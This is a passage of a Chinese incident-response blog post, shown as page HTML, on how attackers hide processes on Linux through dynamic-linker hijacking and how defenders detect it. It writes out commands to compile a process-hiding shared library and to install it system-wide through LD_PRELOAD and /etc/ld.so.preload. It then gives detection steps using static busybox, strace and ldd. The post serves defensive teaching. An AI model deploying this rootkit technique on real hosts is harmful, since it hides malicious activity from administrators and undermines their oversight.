+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">sed</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -i</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">s/evil_script.py/simulation/</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> processhider.c</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic"> # 替换隐藏程序名，根据自己复现程序去替换</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">gcc</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -Wall</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -fPIC</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -shared</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -o</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> libprocesshider.so</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> processhider.c</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -ldl</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic"> # 编译动态链接库</span></span></code></pre>
+<p>对于链接库的使用，可以直接通过<code>LD_PRELOAD</code>变量去直接复现，如下</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">nohup</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> ./simulation</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> &#x26;</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic"> # 程序运行</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">ps</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -aux</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">|</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">grep</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> simulation</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic"> # 正常情况下直接看进程</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">LD_PRELOAD</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$PWD</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">/libprocesshider.so</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> ps</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -aux</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> grep</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> simulation</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic"> # 加载恶意链接库之后查看进程 </span></span></code></pre>
+<p>结果如下
+<img src="https://static.synex.space/images/2026/10/02/9a594dbf0148-Pasted-image-20260908135650.png" alt="">
+在真实环境下，攻击者都是直接修改<code>/etx/ld.so.preload</code>、<code>/etc/ld.so.conf</code>文件，或在<code>/etc/ld.so.conf.d/</code>目录下单独创建加载配置。下面命令以修改<code>/etc/ld.so.preload</code>文件来实现整个系统的劫持</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">cat</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> >></span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">/etc/ld.so.preload</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">&#x3C;&#x3C;</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">EOF</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">/root/simulation/target/release/libprocesshider.so</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">EOF</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">ps</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -aux</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">|</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">grep</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> simulation</span></span></code></pre>
+<p>结果如下
+<img src="https://static.synex.space/images/2026/10/02/0a7f3b40dca3-Pasted-image-20260912132015.png" alt="">
+针对不同的动态链接库配置文件，其生效方式存在一定差异。<code>/etc/ld.so.preload</code>中需要直接指定待加载的 <code>.so</code> 文件，配置写入后，后续启动的动态链接程序会直接受到影响。而 <code>/etc/ld.so.conf</code> 及 <code>/etc/ld.so.conf.d/*.conf</code> 主要用于配置动态链接库的搜索路径。修改这些配置后，需要执行 <code>ldconfig</code> 更新 <code>/etc/ld.so.cache</code>，使新增路径中的动态链接库能够被动态链接器检索。此外，在某些情况下，还会直接隐藏恶意文件的位置，以及隐藏 <code>/etc/ld.so.preload</code> 文件，但实际实现思路基本一致。</p>
+<h3 id="排查方案-3">排查方案</h3>
+<p>如果发现异常，但使用系统命令无法进一步定位，可以先使用不依赖系统动态链接库的工具进行辅助排查，例如静态编译的 busybox，以避免排查工具本身受到动态链接库劫持的影响。这类工具最好自己本地准备一份，而不是通过网络下载的形式获取，排查方法如下</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">wget</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">chmod</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> +x</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> busybox</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">./busybox</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> ps</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">grep</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> simulation</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">./busybox</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> netstat</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -tnlap</span></span></code></pre>
+<p>结果如下
+<img src="https://static.synex.space/images/2026/10/02/f92fd105e099-Pasted-image-20260912113749.png" alt="">
+<img src="https://static.synex.space/images/2026/10/02/24acc0d8a35e-Pasted-image-20260912115427.png" alt="">
+然后分别检查<code>/etc/ld.so.conf</code>，<code>/etc/ld.so.preload</code>，<code>/etc/ld.so.conf.d/*</code>文件，看他们是否有可疑的加载内容，针对<code>busybox</code>的排查方案是需要利用到外部工具，让其不受动态链接库劫持的影响，对于无法上传工具，只有系统命令的情况下也可以通过追踪调用链的方式去发现问题，例如<code>strace</code>和<code>ldd</code>，使用方法如下</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">strace</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -f</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -e</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> trace=openat</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> ps</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> 2>&#x26;1</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> grep</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">\.so</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">ldd</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> /usr/bin/ps</span></span></code></pre>
+<p>这两个方法都可以直接发现异常，结果如下
+<img src="https://static.synex.space/images/2026/10/02/9f58d149cc81-Pasted-image-20260912114954.png" alt="">
+但是通常恶意的so文件不会出现在过于明显的位置，这通常需要一定的经验去判断。个人认为最好的方式是发现可能存在劫持后，直接使用静态编译的<code>busybox</code>进行排查。需要注意的是，对于已经运行的进程，即使删除了恶意 so 文件、修复了<code>/etc/ld.so.preload</code>、<code>/etc/ld.so.conf</code>、<code>/etc/ld.so.conf.d/*.conf</code>，也无法完全恢复，因为恶意 so 已经被动态链接器映射进这些进程的地址空间，在进程退出前一直有效。正确的做法是先清理恶意文件和配置，再重启系统，才能彻底恢复。</p></article></div><aside class="border-border sticky top-8 hidden max-h-[calc(100vh-4rem)] overflow-y-auto border-l pl-5 xl:block" aria-label="文章目录" data-pagefind-ignore><nav class="pb-4"><p class="text-foreground mb-3 text-base font-semibold tracking-wide">Catalogue</p><ol class="space-y-1 text-sm"><li><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#进程名伪装" data-toc-link data-toc-slug="进程名伪装">进程名伪装</a></li><li class="pl-3"><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#攻击原理" data-toc-link data-toc-slug="攻击原理">攻击原理</a></li><li class="pl-3"><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#实现方案" data-toc-link data-toc-slug="实现方案">实现方案</a></li><li class="pl-3"><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#排查方案" data-toc-link data-toc-slug="排查方案">排查方案</a></li><li><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#进程绑定挂载" data-toc-link data-toc-slug="进程绑定挂载">进程绑定挂载</a></li><li class="pl-3"><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#攻击原理-1" data-toc-link data-toc-slug="攻击原理-1">攻击原理</a></li><li class="pl-3"><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#实现方案-1" data-toc-link data-toc-slug="实现方案-1">实现方案</a></li><li class="pl-3"><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#排查方案-1" data-toc-link data-toc-slug="排查方案-1">排查方案</a></li><li><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#命令劫持" data-toc-link data-toc-slug="命令劫持">命令劫持</a></li><li class="pl-3"><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#攻击原理-2" data-toc-link data-toc-slug="攻击原理-2">攻击原理</a></li><li class="pl-3"><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#实现方案-2" data-toc-link data-toc-slug="实现方案-2">实现方案</a></li><li class="pl-3"><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#排查方案-2" data-toc-link data-toc-slug="排查方案-2">排查方案</a></li><li><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#动态链接库劫持" data-toc-link data-toc-slug="动态链接库劫持">动态链接库劫持</a></li><li class="pl-3"><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#攻击原理-3" data-toc-link data-toc-slug="攻击原理-3">攻击原理</a></li><li class="pl-3"><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#实现方案-3" data-toc-link data-toc-slug="实现方案-3">实现方案</a></li><li class="pl-3"><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#排查方案-3" data-toc-link data-toc-slug="排查方案-3">排查方案</a></li></ol></nav></aside><script data-astro-rerun>
+  function initTableOfContents() {
+    const toc = document.querySelector("[aria-label='文章目录']");
+    const article = document.getElementById("article");
+    if (!toc || !article) return;
+
+    const links = Array.from(toc.querySelectorAll("[data-toc-link]"));
+    const headingElements = links
+      .map(link => document.getElementById(link.dataset.tocSlug ?? ""))
+      .filter(Boolean);
+
+    if (headingElements.length === 0) return;
+
+    function updateActiveLink() {
+      let activeHeading = headingElements[0];
+
+      for (const heading of headingElements) {
+        if (heading.getBoundingClientRect().top <= 128) {
+          activeHeading = heading;
+        } else {
+          break;
+        }
+      }
+
+      for (const link of links) {
+        const isActive = link.dataset.tocSlug === activeHeading.id;
+        link.classList.toggle("border-accent", isActive);
+        link.classList.toggle("text-accent", isActive);
+        link.classList.toggle("font-medium", isActive);
+        link.classList.toggle("text-muted-foreground", !isActive);
+        link.toggleAttribute("aria-current", isActive);
+      }
+    }
+
+    updateActiveLink();
+    window.addEventListener("scroll", updateActiveLink, { passive: true });
+    window.addEventListener("resize", updateActiveLink);
+
+    document.addEventListener(
+      "astro:before-swap",
+      () => {
+        window.removeEventListener("scroll", updateActiveLink);
+        window.removeEventListener("resize", updateActiveLink);
+      },
+      { once: true }
+    );
+  }
+
+  initTableOfContents();
+</script></div><hr class="my-8 border-dashed"><div id="btt-btn-container" class="fixed inset-e-4 bottom-8 z-50 md:sticky md:inset-e-auto md:float-end md:me-1 translate-y-14 opacity-0 transition duration-500"><button data-button="back-to-top" class="group bg-background relative px-2 py-1 size-14 rounded-full shadow-xl md:h-8 md:w-fit md:rounded-md md:shadow-none md:focus-visible:rounded-none md:bg-background/35 md:bg-clip-padding md:backdrop-blur-lg"><span id="progress-indicator" class="absolute inset-0 -z-10 block size-14 scale-110 rounded-full bg-transparent md:hidden md:h-8 md:rounded-md"></span><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block rotate-90 md:hidden" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M5 12h14M5 12l6 6M5 12l6-6" /></svg><span class="group-hover:text-accent sr-only text-sm md:not-sr-only"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-4" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M12 5v14M16 9l-4-4M8 9l4-4" /></svg>Back to top</span></button></div><script data-astro-rerun>
+  function backToTop() {
+    const rootElement = document.documentElement;
+    const btnContainer = document.querySelector("#btt-btn-container");
+    const backToTopBtn = document.querySelector("[data-button='back-to-top']");
+    const progressIndicator = document.querySelector("#progress-indicator");
+
+    if (!rootElement || !btnContainer || !backToTopBtn || !progressIndicator)
+      return;
+
+    backToTopBtn.addEventListener("click", () => {
+      document.body.scrollTop = 0;
+      document.documentElement.scrollTop = 0;
+    });
+
+    let lastVisible = null;
+    function handleScroll() {
+      const scrollTotal = rootElement.scrollHeight - rootElement.clientHeight;
+      const scrollTop = rootElement.scrollTop;
+      const scrollPercent = Math.floor((scrollTop / scrollTotal) * 100);
+
+      progressIndicator.style.setProperty(
+        "background-image",
+        `conic-gradient(var(--accent), var(--accent) ${scrollPercent}%, transparent ${scrollPercent}%)`
+      );
+
+      const isVisible = scrollTop / scrollTotal > 0.3;
+
+      if (isVisible !== lastVisible) {
+        btnContainer.classList.toggle("opacity-100", isVisible);
+        btnContainer.classList.toggle("translate-y-0", isVisible);
+        btnContainer.classList.toggle("opacity-0", !isVisible);
+        btnContainer.classList.toggle("translate-y-14", !isVisible);
+        lastVisible = isVisible;
+      }
+    }
+
+    let ticking = false;
+    document.addEventListener("scroll", () => {
+      if (!ticking) {
+        window.requestAnimationFrame(() => {
+          handleScroll();
+          ticking = false;
+        });
+        ticking = true;
+      }
+    });
+  }
+  backToTop();
+</script><ul class="mt-4 mb-8 flex flex-wrap gap-4 sm:my-8"><li><a data-astro-transition-scope="astro-bztu2lml-1" href="/tags/应急响应/" class="flex items-center gap-0.5 border-foreground border-b-2 border-dashed hover:border-accent hover:text-accent hover:-mt-0.5 focus-visible:text-accent focus-visible:border-none text-sm"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="opacity-80 size-4" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M5 9h14M5 15h14M11 4 7 20M17 4l-4 16" /></svg>应急响应</a></li><li><a data-astro-transition-scope="astro-bztu2lml-2" href="/tags/劫持/" class="flex items-center gap-0.5 border-foreground border-b-2 border-dashed hover:border-accent hover:text-accent hover:-mt-0.5 focus-visible:text-accent focus-visible:border-none text-sm"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="opacity-80 size-4" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M5 9h14M5 15h14M11 4 7 20M17 4l-4 16" /></svg>劫持</a></li><li><a data-astro-transition-scope="astro-bztu2lml-3" href="/tags/攻防/" class="flex items-center gap-0.5 border-foreground border-b-2 border-dashed hover:border-accent hover:text-accent hover:-mt-0.5 focus-visible:text-accent focus-visible:border-none text-sm"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="opacity-80 size-4" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M5 9h14M5 15h14M11 4 7 20M17 4l-4 16" /></svg>攻防</a></li></ul><div class="flex flex-none flex-col items-center justify-center gap-1 md:items-start"><span class="italic">Share this post:</span><div class="text-center"><a href="https://wa.me/?text=https://synex.space/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux-%E5%B8%B8%E8%A7%81%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E5%88%86%E6%9E%90/" title="Share this post on Whatsapp" target="_blank" rel="noopener noreferrer" class="group inline-flex items-center gap-1 hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="m3 21 1.65-3.8a9 9 0 1 1 3.4 2.9z" /><path d="M9 10a.5.5 0 0 0 1 0V9a.5.5 0 0 0-1 0za5 5 0 0 0 5 5h1a.5.5 0 0 0 0-1h-1a.5.5 0 0 0 0 1" /></svg><span class="sr-only">Share this post on Whatsapp</span></a><a href="https://www.facebook.com/sharer.php?u=https://synex.space/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux-%E5%B8%B8%E8%A7%81%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E5%88%86%E6%9E%90/" title="Share this post on Facebook" target="_blank" rel="noopener noreferrer" class="group inline-flex items-center gap-1 hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M7 10v4h3v7h4v-7h3l1-4h-4V8a1 1 0 0 1 1-1h3V3h-3a5 5 0 0 0-5 5v2z" /></svg><span class="sr-only">Share this post on Facebook</span></a><a href="https://x.com/intent/post?url=https://synex.space/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux-%E5%B8%B8%E8%A7%81%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E5%88%86%E6%9E%90/" title="Share this post on X" target="_blank" rel="noopener noreferrer" class="group inline-flex items-center gap-1 hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="m4 4 11.733 16H20L8.267 4zM4 20l6.768-6.768m2.46-2.46L20 4" /></svg><span class="sr-only">Share this post on X</span></a><a href="https://t.me/share/url?url=https://synex.space/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux-%E5%B8%B8%E8%A7%81%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E5%88%86%E6%9E%90/" title="Share this post on Telegram" target="_blank" rel="noopener noreferrer" class="group inline-flex items-center gap-1 hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="m15 10-4 4 6 6 4-16-18 7 4 2 2 6 3-4" /></svg><span class="sr-only">Share this post on Telegram</span></a><a href="https://pinterest.com/pin/create/button/?url=https://synex.space/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux-%E5%B8%B8%E8%A7%81%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E5%88%86%E6%9E%90/" title="Share this post on Pinterest" target="_blank" rel="noopener noreferrer" class="group inline-flex items-center gap-1 hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="m8 20 4-9M10.7 14c.437 1.263 1.43 2 2.55 2 2.071 0 3.75-1.554 3.75-4a5 5 0 1 0-9.7 1.7" /><path d="M3 12a9 9 0 1 0 18 0 9 9 0 1 0-18 0" /></svg><span class="sr-only">Share this post on Pinterest</span></a><a href="mailto:?subject=See%20this%20post&amp;body=https://synex.space/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux-%E5%B8%B8%E8%A7%81%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E5%88%86%E6%9E%90/" title="Share this post via email" target="_blank" rel="noopener noreferrer" class="group inline-flex items-center gap-1 hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M3 7a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" /><path d="m3 7 9 6 9-6" /></svg><span class="sr-only">Share this post via email</span></a></div></div><hr class="my-8 border-dashed"><div data-pagefind-ignore class="my-8 grid grid-cols-1 gap-6 sm:grid-cols-2"><a href="/posts/phpjm混淆原理与还原/" class="flex w-full justify-end gap-1 text-end hover:opacity-75 sm:col-start-2"><div><span>Next Post</span><div class="text-accent/85 text-sm">PHPJM混淆原理与还原</div></div><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block flex-none rtl:rotate-180" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M5 12h14M13 18l6-6M13 6l6 6" /></svg></a></div></main><footer class="app-layout mt-auto"><div class="border-border flex flex-col items-center justify-between border-t py-6 sm:flex-row-reverse sm:py-4"><div class="flex flex-wrap items-center gap-1"><a href="https://github.com/Synex93" title="Syn3x's Blog on Github" class="group inline-flex items-center gap-1 hover:text-accent p-2 hover:rotate-6 sm:p-1"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6 0 0 0-1.3-3.2 4.2 4.2 0 0 0-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3 0 0 0-6.2 0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2 0 0 0-.1 3.2A4.6 4.6 0 0 0 4 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21" /></svg><span class="sr-only">Syn3x&#39;s Blog on Github</span></a><a href="mailto:me@synex.space" title="Send an email to Syn3x's Blog" class="group inline-flex items-center gap-1 hover:text-accent p-2 hover:rotate-6 sm:p-1"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M3 7a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" /><path d="m3 7 9 6 9-6" /></svg><span class="sr-only">Send an email to Syn3x&#39;s Blog</span></a></div><div class="my-2 whitespace-nowrap"><span>Copyright &#169; 2026 Syn3x. All rights reserved.</span></div></div></footer><script type="module">var e=`theme`,t=`light`,n=`dark`;function r(){return localStorage.getItem(e)||(window.matchMedia(`(prefers-color-scheme: dark)`).matches?n:t)}var i=window.__theme?.value??r();function a(){localStorage.setItem(e,i),o()}function o(){let e=document.firstElementChild;e?.setAttribute(`data-theme`,i),e?.classList.toggle(`dark`,i===n),document.querySelector(`#theme-btn`)?.setAttribute(`aria-label`,i);let t=window.getComputedStyle(document.body).backgroundColor;document.querySelector(`meta[name='theme-color']`)?.setAttribute(`content`,t)}function s(){o(),document.querySelector(`#theme-btn`)?.addEventListener(`click`,()=>{i=i===t?n:t,a()})}s(),document.addEventListener(`astro:after-swap`,s),document.addEventListener(`astro:before-swap`,e=>{let 